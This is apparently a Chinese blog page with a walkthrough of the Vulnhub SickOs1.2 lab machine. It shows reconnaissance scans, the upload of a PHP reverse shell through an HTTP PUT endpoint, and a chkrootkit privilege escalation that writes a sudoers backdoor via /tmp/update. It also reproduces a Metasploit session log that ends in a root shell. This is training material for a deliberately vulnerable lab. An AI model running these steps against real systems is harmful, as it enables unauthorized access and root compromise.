@@ -1,0 +1,656 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.4.0">
+  <link rel="mask-icon" href="/images/logo.svg?v=7.4.0" color="#222">
+  <link rel="alternate" href="/atom.xml" title="Sh4Nn0n's Blog" type="application/atom+xml">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.4.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="SickOs1.2信息收集ifconfig1ifconfig扫描ip1netdiscover -i eth01nmap -sn 192.168.208.1/24 -T4端口探测1nmap -Pn -vv -T4 -p- --max-retries 1 -sS --max-scan-delay 20 192.168.208.140">
+<meta name="keywords" content="渗透测试,Vulnhub,OSCP,SickOs1.2">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulnhub-SickOs1.2-WalkThrough">
+<meta property="og:url" content="http://yoursite.com/2020/03/06/vulnhub-SickOs1-2-WalkThrough/index.html">
+<meta property="og:site_name" content="Sh4Nn0n&#39;s Blog">
+<meta property="og:description" content="SickOs1.2信息收集ifconfig1ifconfig扫描ip1netdiscover -i eth01nmap -sn 192.168.208.1/24 -T4端口探测1nmap -Pn -vv -T4 -p- --max-retries 1 -sS --max-scan-delay 20 192.168.208.140">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://yoursite.com/2020/03/06/vulnhub-SickOs1-2-WalkThrough/1.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/06/vulnhub-SickOs1-2-WalkThrough/2.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/06/vulnhub-SickOs1-2-WalkThrough/3.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/06/vulnhub-SickOs1-2-WalkThrough/4.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/06/vulnhub-SickOs1-2-WalkThrough/5.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/06/vulnhub-SickOs1-2-WalkThrough/6.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/06/vulnhub-SickOs1-2-WalkThrough/7.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/06/vulnhub-SickOs1-2-WalkThrough/8.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/06/vulnhub-SickOs1-2-WalkThrough/9.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/06/vulnhub-SickOs1-2-WalkThrough/10.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/06/vulnhub-SickOs1-2-WalkThrough/11.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/06/vulnhub-SickOs1-2-WalkThrough/12.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/06/vulnhub-SickOs1-2-WalkThrough/13.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/06/vulnhub-SickOs1-2-WalkThrough/14.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/06/vulnhub-SickOs1-2-WalkThrough/15.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/06/vulnhub-SickOs1-2-WalkThrough/16.png">
+<meta property="og:updated_time" content="2020-03-06T02:03:29.439Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="vulnhub-SickOs1.2-WalkThrough">
+<meta name="twitter:description" content="SickOs1.2信息收集ifconfig1ifconfig扫描ip1netdiscover -i eth01nmap -sn 192.168.208.1/24 -T4端口探测1nmap -Pn -vv -T4 -p- --max-retries 1 -sS --max-scan-delay 20 192.168.208.140">
+<meta name="twitter:image" content="http://yoursite.com/2020/03/06/vulnhub-SickOs1-2-WalkThrough/1.png">
+  <link rel="canonical" href="http://yoursite.com/2020/03/06/vulnhub-SickOs1-2-WalkThrough/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>vulnhub-SickOs1.2-WalkThrough | Sh4Nn0n's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Sh4Nn0n's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">^.^</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+      
+        
+        <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a href="javascript:;" class="popup-trigger">
+        
+          <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+      </li>
+    
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="搜索..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+      <article itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block post">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/06/vulnhub-SickOs1-2-WalkThrough/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Sh4Nn0n">
+      <meta itemprop="description" content="^.^">
+      <meta itemprop="image" content="/images/header.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sh4Nn0n's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">vulnhub-SickOs1.2-WalkThrough
+
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              
+                
+              
+
+              <time title="创建时间：2020-03-06 09:40:20 / 修改时间：10:03:29" itemprop="dateCreated datePublished" datetime="2020-03-06T09:40:20+08:00">2020-03-06</time>
+            </span>
+          
+            
+
+            
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Vulnhub/" itemprop="url" rel="index"><span itemprop="name">Vulnhub</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="SickOs1-2"><a href="#SickOs1-2" class="headerlink" title="SickOs1.2"></a>SickOs1.2</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="ifconfig"><a href="#ifconfig" class="headerlink" title="ifconfig"></a>ifconfig</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ifconfig</span></span><br></pre></td></tr></table></figure><p><img src="/2020/03/06/vulnhub-SickOs1-2-WalkThrough/1.png" alt></p><h3 id="扫描ip"><a href="#扫描ip" class="headerlink" title="扫描ip"></a>扫描ip</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -<span class="selector-tag">i</span> eth0</span><br></pre></td></tr></table></figure><p><img src="/2020/03/06/vulnhub-SickOs1-2-WalkThrough/2.png" alt></p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn <span class="number">192.168</span><span class="number">.208</span><span class="number">.1</span>/<span class="number">24</span> -T4</span><br></pre></td></tr></table></figure><p><img src="/2020/03/06/vulnhub-SickOs1-2-WalkThrough/3.png" alt></p><h3 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h3><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -vv -T4 -p- --max-retries <span class="number">1</span> -sS --max-scan-delay <span class="number">20</span> <span class="number">192.168</span><span class="number">.208</span><span class="number">.140</span></span><br></pre></td></tr></table></figure><a id="more"></a>
+
+
+
+
+
+
+
+
+
+
+<p><img src="/2020/03/06/vulnhub-SickOs1-2-WalkThrough/4.png" alt></p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -T4 -p <span class="number">80</span>,<span class="number">22</span> <span class="number">192.168</span><span class="number">.208</span><span class="number">.140</span> --version-all --osscan-guess --script=vuln -vv -n -oN /root/Shannon/portdetail.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/06/vulnhub-SickOs1-2-WalkThrough/5.png" alt></p>
+<h3 id="服务探测"><a href="#服务探测" class="headerlink" title="服务探测"></a>服务探测</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">nikto</span> <span class="selector-tag">-host</span> 192<span class="selector-class">.168</span><span class="selector-class">.208</span><span class="selector-class">.140</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/06/vulnhub-SickOs1-2-WalkThrough/6.png" alt></p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb <span class="string">http:</span><span class="comment">//192.168.208.140/</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/06/vulnhub-SickOs1-2-WalkThrough/7.png" alt></p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X OPTIONS http://<span class="number">192.168</span><span class="meta">.208</span><span class="meta">.140</span>/<span class="keyword">test</span>/ -v</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/06/vulnhub-SickOs1-2-WalkThrough/8.png" alt></p>
+<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><h3 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h3><p><img src="/2020/03/06/vulnhub-SickOs1-2-WalkThrough/9.png" alt></p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="params">--upload-file</span>  php-reverse-shell.txt -v <span class="params">--url</span> http:<span class="string">//192.168.159.132/test/reverse_shell.php</span> -0 <span class="params">--http1</span>.0</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/06/vulnhub-SickOs1-2-WalkThrough/10.png" alt></p>
+<h3 id="连接shell"><a href="#连接shell" class="headerlink" title="连接shell"></a>连接shell</h3><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp <span class="number">4444</span></span><br></pre></td></tr></table></figure>
+
+<p>这里连失败了, 考虑到可能是端口被过滤了, 尝试切换443端口,需要重新上传<br><img src="/2020/03/06/vulnhub-SickOs1-2-WalkThrough/11.png" alt></p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp <span class="number">443</span></span><br><span class="line">curl -X GET http://<span class="number">192.168</span><span class="meta">.208</span><span class="meta">.140</span>/<span class="keyword">test</span>/reverse_shell1.php -v</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/06/vulnhub-SickOs1-2-WalkThrough/12.png" alt><br>这个shell没有路径回显, 调用python模块</p>
+<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -<span class="built_in">c</span> '<span class="keyword">import</span> pty; pty.spawn("/bin/bash")'</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/06/vulnhub-SickOs1-2-WalkThrough/13.png" alt></p>
+<h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lsb_release -a</span><br><span class="line">ls -l <span class="regexp">/etc/</span>cron.daily</span><br><span class="line">dpkg -l | <span class="keyword">grep</span> chkrootkit</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/06/vulnhub-SickOs1-2-WalkThrough/14.png" alt><br><img src="/2020/03/06/vulnhub-SickOs1-2-WalkThrough/15.png" alt><br><img src="/2020/03/06/vulnhub-SickOs1-2-WalkThrough/16.png" alt><br>利用chkrootkit的漏洞 <a href="https://www.exploit-db.com/exploits/33899" target="_blank" rel="noopener">CVE-2014-0476</a><br>进入tmp之后然后写入下面的命令, 等待cron.daily运行获得权限提升</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> '<span class="keyword">echo</span> <span class="string">"www-data ALL=NOPASSWD: ALL"</span> &gt;&gt; <span class="string">/etc/sudoers</span> &amp;&amp; chmod 440 <span class="string">/etc/sudoers</span>' &gt; <span class="string">/tmp/update</span></span><br></pre></td></tr></table></figure>
+
+<p>我们可以手动运行cron.daily模块</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">run</span><span class="bash">-parts /etc/cron.daily</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="然后应该就root了"><a href="#然后应该就root了" class="headerlink" title="然后应该就root了"></a>然后应该就root了</h3><p>这里列举如何使用msf提权</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; show <span class="keyword">options</span></span><br><span class="line"></span><br><span class="line">Module <span class="keyword">options</span> (exploit/multi/handler):</span><br><span class="line"></span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   ----  ---------------  --------  -----------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   <span class="number">0</span>   Wildcard Target</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="keyword">set</span> lport <span class="comment">443</span></span><br><span class="line">lport <span class="comment">=&gt; 443</span></span><br><span class="line">msf5 <span class="comment">exploit(multi</span>/handler) &gt; set lhost <span class="number">192.168</span><span class="number">.208</span><span class="number">.131</span></span><br><span class="line">lhost =&gt; <span class="number">192.168</span><span class="number">.208</span><span class="number">.131</span></span><br><span class="line">msf5 exploit(multi/<span class="comment">handler) &gt; set payload linux</span>/x86/<span class="comment">shell_reverse_tcp</span></span><br><span class="line">payload <span class="comment">=&gt; linux</span>/x86/<span class="comment">shell_reverse_tcp</span></span><br><span class="line">msf5 <span class="comment">exploit(multi</span>/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on <span class="number">192.168</span><span class="number">.208</span><span class="number">.131</span>:<span class="number">443</span> </span><br><span class="line">[*] Command shell session <span class="number">1</span> opened (<span class="number">192.168</span><span class="number">.208</span><span class="number">.131</span>:<span class="number">443</span> -&gt; <span class="number">192.168</span><span class="number">.208</span><span class="number">.140</span>:<span class="number">43789</span>) at <span class="number">2020</span><span class="number">-01</span><span class="number">-19</span> <span class="number">02</span>:<span class="number">08</span>:<span class="number">17</span> <span class="number">-0500</span></span><br><span class="line"></span><br><span class="line">whoami</span><br><span class="line">www-data</span><br><span class="line">$ ^Z</span><br><span class="line">Background session <span class="number">1</span>? [y/<span class="comment">N]  y</span></span><br><span class="line">msf5 <span class="comment">exploit(multi</span>/handler) &gt; search chkroot</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                           Disclosure Date  Rank    Check  Description</span><br><span class="line">   -  ----                           ---------------  ----    -----  -----------</span><br><span class="line">   <span class="number">1</span>  exploit/<span class="comment">unix</span>/local/<span class="comment">chkrootkit  2014-06-04       manual  Yes    Chkrootkit Local Privilege Escalation</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 <span class="comment">exploit(multi</span>/handler) &gt; use exploit/<span class="comment">unix</span>/local/<span class="comment">chkrootkit</span> </span><br><span class="line">msf5 <span class="comment">exploit(unix</span>/local/<span class="comment">chkrootkit) &gt; show options</span></span><br><span class="line"></span><br><span class="line">Module <span class="comment">options (exploit</span>/unix/<span class="comment">local</span>/chkrootkit):</span><br><span class="line"></span><br><span class="line">   Name        Current Setting       Required  Description</span><br><span class="line">   ----        ---------------       --------  -----------</span><br><span class="line">   CHKROOTKIT  /<span class="comment">usr</span>/sbin/<span class="comment">chkrootkit  yes       Path to chkrootkit</span></span><br><span class="line">   SESSION                           <span class="comment">yes       The session to run this module on.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit <span class="comment">target:</span></span><br><span class="line"></span><br><span class="line">   Id  <span class="comment">Name</span></span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 <span class="comment">exploit(unix</span>/local/<span class="comment">chkrootkit) &gt; set session 1</span></span><br><span class="line">session <span class="comment">=&gt; 1</span></span><br><span class="line">msf5 <span class="comment">exploit(unix</span>/local/<span class="comment">chkrootkit) &gt; set lport 8080</span></span><br><span class="line">lport <span class="comment">=&gt; 8080</span></span><br><span class="line">msf5 <span class="comment">exploit(unix</span>/local/<span class="comment">chkrootkit) &gt; show options</span></span><br><span class="line"></span><br><span class="line">Module <span class="comment">options (exploit</span>/unix/<span class="comment">local</span>/chkrootkit):</span><br><span class="line"></span><br><span class="line">   Name        Current Setting       Required  Description</span><br><span class="line">   ----        ---------------       --------  -----------</span><br><span class="line">   CHKROOTKIT  /<span class="comment">usr</span>/sbin/<span class="comment">chkrootkit  yes       Path to chkrootkit</span></span><br><span class="line">   SESSION     <span class="comment">1                     yes       The session to run this module on.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit <span class="comment">target:</span></span><br><span class="line"></span><br><span class="line">   Id  <span class="comment">Name</span></span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 <span class="comment">exploit(unix</span>/local/<span class="comment">chkrootkit) &gt; run -j</span></span><br><span class="line">[*] Exploit <span class="comment">running as background job 0.</span></span><br><span class="line">[*] Exploit <span class="comment">completed, but no session was created.</span></span><br><span class="line"></span><br><span class="line">[*] Started <span class="comment">reverse TCP double handler on 192.168.208.131:8080</span> </span><br><span class="line">[!] Rooting <span class="comment">depends on the crontab (this could take a while)</span></span><br><span class="line">msf5 <span class="comment">exploit(unix</span>/local/<span class="comment">chkrootkit) &gt; [*] Payload written to</span> /tmp/<span class="comment">update</span></span><br><span class="line">[*] Waiting <span class="comment">for chkrootkit to run via cron...</span></span><br><span class="line">[*] Accepted <span class="comment">the first client connection...</span></span><br><span class="line">[*] Accepted <span class="comment">the second client connection...</span></span><br><span class="line">[*] Command: echo <span class="comment">oIVq5S5JD7ilVvto</span>;</span><br><span class="line">[*] Writing to socket A</span><br><span class="line">[*] Writing to socket B</span><br><span class="line">[*] Reading from sockets...</span><br><span class="line">[*] Reading from socket B</span><br><span class="line">[*] B: <span class="string">"oIVq5S5JD7ilVvto\r\n"</span></span><br><span class="line">[*] Matching...</span><br><span class="line">[*] A is input...</span><br><span class="line">[*] Command shell session <span class="number">2</span> opened (<span class="number">192.168</span><span class="number">.208</span><span class="number">.131</span>:<span class="number">8080</span> -&gt; <span class="number">192.168</span><span class="number">.208</span><span class="number">.140</span>:<span class="number">58545</span>) at <span class="number">2020</span><span class="number">-01</span><span class="number">-19</span> <span class="number">02</span>:<span class="number">10</span>:<span class="number">31</span> <span class="number">-0500</span></span><br><span class="line">[+] Deleted /tmp/update</span><br><span class="line">whoami</span><br><span class="line">[*] exec: whoami</span><br><span class="line"></span><br><span class="line">root</span><br><span class="line">msf5 exploit(unix/local/chkrootkit) &gt; sessions -l</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type             Information                                                                       Connection</span><br><span class="line">  --  ----  ----             -----------                                                                       ----------</span><br><span class="line">  <span class="number">1</span>         shell x86/linux  Linux ubuntu <span class="number">3.11</span><span class="number">.0</span><span class="number">-15</span>-generic #<span class="number">25</span>~precise1-Ubuntu SMP Thu Jan <span class="number">30</span> <span class="number">17</span>:<span class="number">42</span>:<span class="number">40</span> UT...  <span class="number">192.168</span><span class="number">.208</span><span class="number">.131</span>:<span class="number">443</span> -&gt; <span class="number">192.168</span><span class="number">.208</span><span class="number">.140</span>:<span class="number">43789</span> (<span class="number">192.168</span><span class="number">.208</span><span class="number">.140</span>)</span><br><span class="line">  <span class="number">2</span>         shell cmd/unix                                                                                     <span class="number">192.168</span><span class="number">.208</span><span class="number">.131</span>:<span class="number">8080</span> -&gt; <span class="number">192.168</span><span class="number">.208</span><span class="number">.140</span>:<span class="number">58545</span> (<span class="number">192.168</span><span class="number">.208</span><span class="number">.140</span>)</span><br><span class="line"></span><br><span class="line">msf5 exploit(unix/local/chkrootkit) &gt; sessions -i <span class="number">2</span></span><br><span class="line">[*] Starting interaction with <span class="number">2.</span>..</span><br><span class="line"></span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">id</span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root)</span><br><span class="line">cd /root</span><br><span class="line">ls</span><br><span class="line"><span class="number">304</span>d840d52840689e0ab0af56d6d3a18-chkrootkit<span class="number">-0.49</span>.tar.gz</span><br><span class="line"><span class="number">7</span>d03aaa2bf93d80040f3f22ec6ad9d5a.txt</span><br><span class="line">chkrootkit<span class="number">-0.49</span></span><br><span class="line">newRule</span><br><span class="line">cat <span class="number">7</span>d03aaa2bf93d80040f3f22ec6ad9d5a.txt</span><br><span class="line">WoW! <span class="keyword">If</span> you are viewing this, You have <span class="string">"Sucessfully!!"</span> completed SickOs1<span class="number">.2</span>, the challenge is more focused on elimination of tool in real scenarios where tools can be blocked during an assesment <span class="keyword">and</span> thereby fooling tester(s), gathering more information about the target <span class="keyword">using</span> different methods, though <span class="keyword">while</span> developing many of the tools were limited/completely blocked, to get a feel of Old School <span class="keyword">and</span> testing it manually.</span><br><span class="line"></span><br><span class="line">Thanks <span class="keyword">for</span> giving this try.</span><br><span class="line"></span><br><span class="line">@vulnhub: Thanks <span class="keyword">for</span> hosting this UP!.</span><br></pre></td></tr></table></figure>
+
